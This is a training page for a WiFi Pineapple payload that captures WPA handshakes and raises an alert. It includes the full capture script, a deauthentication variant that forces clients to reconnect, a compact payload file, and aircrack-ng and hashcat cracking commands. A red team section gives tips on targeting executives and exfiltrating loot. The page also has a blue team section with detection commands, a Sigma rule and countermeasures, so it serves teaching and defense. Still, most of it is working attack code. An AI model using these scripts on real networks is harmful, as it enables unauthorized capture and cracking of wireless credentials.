# PP-B02: Handshake Alert

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-B02 |
| **Name** | Handshake Alert |
| **Difficulty** | Basic |
| **Type** | Alert |
| **Purpose** | Notify when WPA handshake is captured |
| **MITRE ATT&CK** | T1040 (Network Sniffing) |

## What This Payload Does

Monitors for WPA/WPA2 handshake captures and sends an alert when one is obtained. Essential for passive reconnaissance operations where you need to know when you've captured authentication data.

---

## Understanding WPA Handshakes

```
┌─────────────────────────────────────────────────────────────┐
│              WPA 4-WAY HANDSHAKE                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   CLIENT                              ACCESS POINT           │
│      │                                     │                 │
│      │◄────── Message 1: ANonce ──────────│                 │
│      │        (AP sends random number)     │                 │
│      │                                     │                 │
│      │─────── Message 2: SNonce ─────────►│                 │
│      │        (Client sends random + MIC)  │                 │
│      │                                     │                 │
│      │◄────── Message 3: GTK ─────────────│                 │
│      │        (AP sends group key)         │                 │
│      │                                     │                 │
│      │─────── Message 4: ACK ────────────►│                 │
│      │        (Client confirms)            │                 │
│      │                                     │                 │
│   ════════════════════════════════════════════              │
│   CAPTURE MESSAGES 2 & 3 = CRACKABLE HANDSHAKE              │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-B02
# Name: Handshake Alert
# Description: Monitor and alert on WPA handshake capture
# Author: Security Training
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan1"
CAPTURE_DIR="/sd/loot/handshakes"
ALERT_WEBHOOK="http://your-server/webhook"
CHECK_INTERVAL=10  # seconds

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-b02.log"
CAPTURE_FILE="$CAPTURE_DIR/capture"
HANDSHAKE_COUNT=0

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Cleaning up..."
    airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# INITIALIZATION
# ============================================
log "Starting PP-B02: Handshake Alert"

# Create capture directory
mkdir -p "$CAPTURE_DIR"

# Check for required tools
command -v airodump-ng >/dev/null 2>&1 || {
    log "ERROR: airodump-ng not found. Install aircrack-ng."
    exit 1
}

# ============================================
# ENABLE MONITOR MODE
# ============================================
log "Enabling monitor mode on $INTERFACE"

# Kill interfering processes
airmon-ng check kill 2>/dev/null

# Start monitor mode
airmon-ng start "$INTERFACE" 2>/dev/null

# Determine monitor interface name
if ip link show "${INTERFACE}mon" >/dev/null 2>&1; then
    MON_INTERFACE="${INTERFACE}mon"
elif ip link show "${INTERFACE}" >/dev/null 2>&1; then
    MON_INTERFACE="${INTERFACE}"
else
    log "ERROR: Could not start monitor mode"
    exit 1
fi

log "Monitor interface: $MON_INTERFACE"

# ============================================
# HANDSHAKE MONITORING
# ============================================

# Start airodump-ng in background
log "Starting handshake capture on $MON_INTERFACE"
airodump-ng --write "$CAPTURE_FILE" --write-interval 5 --output-format pcap "$MON_INTERFACE" &
AIRODUMP_PID=$!

# Function to check for handshakes
check_handshake() {
    local cap_file="${CAPTURE_FILE}-01.cap"

    if [ -f "$cap_file" ]; then
        # Use aircrack-ng to check for valid handshakes
        local result=$(aircrack-ng "$cap_file" 2>/dev/null | grep "1 handshake")

        if [ -n "$result" ]; then
            return 0  # Handshake found
        fi
    fi
    return 1  # No handshake
}

# Function to send alert
send_alert() {
    local network="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    log "ALERT: Handshake captured! Network: $network"

    # LED Alert
    if [ -f /sys/class/leds/pineapple:blue:system/brightness ]; then
        for i in 1 2 3; do
            echo 1 > /sys/class/leds/pineapple:blue:system/brightness
            sleep 0.3
            echo 0 > /sys/class/leds/pineapple:blue:system/brightness
            sleep 0.3
        done
    fi

    # Webhook alert
    if [ -n "$ALERT_WEBHOOK" ] && [ "$ALERT_WEBHOOK" != "http://your-server/webhook" ]; then
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{\"event\":\"handshake\",\"network\":\"$network\",\"time\":\"$timestamp\"}" \
            2>/dev/null
    fi

    # Audio alert (if available)
    [ -f /usr/bin/beep ] && beep -f 1000 -l 500

    # Write to alert file
    echo "$timestamp - Handshake: $network" >> "$CAPTURE_DIR/alerts.txt"
}

# Main monitoring loop
log "Monitoring for handshakes..."

while true; do
    if check_handshake; then
        # Get network info from capture
        NETWORK=$(aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -oP '(?<=\[)[^]]+' | head -1)

        if [ "$HANDSHAKE_COUNT" -eq 0 ] || [ "$NETWORK" != "$LAST_NETWORK" ]; then
            HANDSHAKE_COUNT=$((HANDSHAKE_COUNT + 1))
            LAST_NETWORK="$NETWORK"
            send_alert "$NETWORK"
        fi
    fi

    sleep $CHECK_INTERVAL
done

# Cleanup on exit
cleanup
```

---

## Line-by-Line Breakdown

### Configuration Section
```bash
INTERFACE="wlan1"
```
- `wlan1` is typically the external/injecting interface on Pineapple
- `wlan0` is usually for management

```bash
CAPTURE_DIR="/sd/loot/handshakes"
```
- Store captures on SD card for persistence
- `/sd/` is the mount point for external storage

### Trap for Cleanup
```bash
trap cleanup SIGINT SIGTERM
```
- Catches Ctrl+C (SIGINT) and termination signals
- Ensures monitor mode is disabled when script exits

### Monitor Mode Setup
```bash
airmon-ng check kill
airmon-ng start "$INTERFACE"
```
| Command | Purpose |
|---------|---------|
| `check kill` | Stops NetworkManager, wpa_supplicant, etc. |
| `start` | Puts interface in monitor mode |

### Handshake Detection
```bash
aircrack-ng "$cap_file" 2>/dev/null | grep "1 handshake"
```
- `aircrack-ng` analyzes capture file
- Outputs "1 handshake" when valid EAPOL captured
- This is the simplest detection method

---

## How Handshake Capture Works

### Requirements
1. **Target client connected** - Handshake only happens during connection
2. **Monitor mode** - Passive capture of all packets
3. **Correct channel** - Must be on same channel as target AP

### Capture Methods
```
1. PASSIVE WAIT
   └── Wait for client to naturally connect/reconnect
   └── Takes time but completely undetectable

2. DEAUTH ATTACK (Active)
   └── Force client disconnection
   └── Client reconnects, we capture handshake
   └── Faster but detectable

3. PMKID ATTACK (Clientless)
   └── Request PMKID from AP directly
   └── No client needed
   └── Only works on some routers
```

---

## Alert Methods

### LED Indication
```bash
echo 1 > /sys/class/leds/pineapple:blue:system/brightness
```
- Visual feedback without network access
- Useful in field operations

### Webhook Notification
```bash
curl -s -X POST "$ALERT_WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"event\":\"handshake\",\"network\":\"$network\"}"
```
- Real-time remote notification
- Can trigger other automation

### File Logging
```bash
echo "$timestamp - Handshake: $network" >> "$CAPTURE_DIR/alerts.txt"
```
- Persistent record of all captures
- Useful for review after operation

---

## Integration with Cracking

Once handshake is captured:

```bash
# Copy to cracking machine
scp root@172.16.42.1:/sd/loot/handshakes/*.cap ~/caps/

# Crack with aircrack-ng (dictionary)
aircrack-ng -w /path/to/wordlist.txt capture-01.cap

# Convert to hashcat format
aircrack-ng -J hashcat_output capture-01.cap
hashcat -m 22000 hashcat_output.hc22000 /path/to/wordlist.txt

# Or use hashcat directly with hcxtools
hcxpcapngtool -o hash.22000 capture-01.cap
hashcat -m 22000 hash.22000 wordlist.txt
```

---

## Enhanced Version with Deauth

```bash
#!/bin/bash
# Enhanced: Trigger handshake capture with deauth

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"

# Set channel
iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL"

# Start capture in background
airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
    --write "$CAPTURE_FILE" "$MON_INTERFACE" &

# Send deauth (adjust count as needed)
sleep 5
aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_INTERFACE"

# Wait for handshake
sleep 10

# Check result
if check_handshake; then
    send_alert "$TARGET_BSSID"
fi
```

---

## Red Team Perspective

### Operational Considerations
- Run capture overnight for passive handshake collection
- Deploy multiple Pineapples for wider coverage
- Use channel hopping to cover all networks
- Prioritize high-value targets (executive offices, etc.)

### OPSEC Tips
- Avoid deauth during business hours (more noticeable)
- Use directional antennas to limit exposure
- Randomize MAC address before capture
- Encrypt loot files before exfiltration

---

## Blue Team Perspective

### Detection Methods

```bash
# Detect unusual amount of EAPOL traffic
tshark -i wlan0 -Y "eapol" -c 100

# Detect deauth floods
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c" -c 50 | wc -l
# High count = potential attack
```

### Sigma Rule
```yaml
title: Potential Handshake Capture Activity
status: experimental
description: Detects wireless monitoring tools
logsource:
    product: linux
    service: syslog
detection:
    selection:
        - 'airodump-ng'
        - 'airmon-ng'
        - 'monitor mode'
    condition: selection
level: medium
tags:
    - attack.credential_access
    - attack.t1040
```

### Countermeasures
1. **WPA3** - Resistant to offline cracking
2. **Strong passwords** - 15+ characters, random
3. **WIDS** - Wireless Intrusion Detection
4. **Deauth detection** - Alert on excessive deauths
5. **PMKID protection** - Some APs can disable

---

## Practice Exercises

### Exercise 1: Channel Hopping
Modify the script to hop through channels 1, 6, and 11.

### Exercise 2: Target Filtering
Add ability to only alert for specific SSIDs.

### Exercise 3: Slack Integration
Send alerts to a Slack channel:
```bash
curl -X POST -H 'Content-type: application/json' \
    --data '{"text":"Handshake captured: '$NETWORK'"}' \
    https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK
```

---

## Payload File

Save as `PP-B02_Handshake_Alert.sh`:

```bash
#!/bin/bash
# PP-B02: Handshake Alert (Compact)
INTERFACE="wlan1"
airmon-ng check kill && airmon-ng start $INTERFACE
airodump-ng -w /tmp/cap ${INTERFACE}mon &
while true; do
    [ -f /tmp/cap-01.cap ] && aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "handshake" && echo "HANDSHAKE CAPTURED!" && break
    sleep 5
done
```

---

[← PP-B01 Hello World](PP-B01_Hello_World.md) | [Back to Basic Payloads](README.md) | [Next: PP-B03 Client Alert →](PP-B03_Client_Alert.md)
